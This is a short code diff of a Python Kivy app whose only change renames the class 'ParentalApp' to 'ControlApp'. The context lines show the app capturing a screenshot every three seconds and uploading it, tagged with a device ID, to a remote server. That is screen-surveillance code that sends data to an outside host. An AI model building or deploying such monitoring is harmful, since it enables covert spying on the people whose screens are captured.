@@ -10,7 +10,7 @@ import os
 SERVER_URL = "https://dios-ybjy.onrender.com/upload-screenshot"
 DEVICE_ID = str(uuid.getnode())  # ID único del dispositivo
 
-class ParentalApp(App):
+class ControlApp(App):
     def build(self):
         Clock.schedule_interval(self.capture_and_upload, 3)  # cada 3 segundos
         return Label(text="Control activo/// Conexión exitosa")
@@ -28,4 +28,4 @@ class ParentalApp(App):
             print("Error al capturar/subir:", e)
 
 if __name__ == '__main__':
-    ParentalApp().run()
+    ControlApp().run()
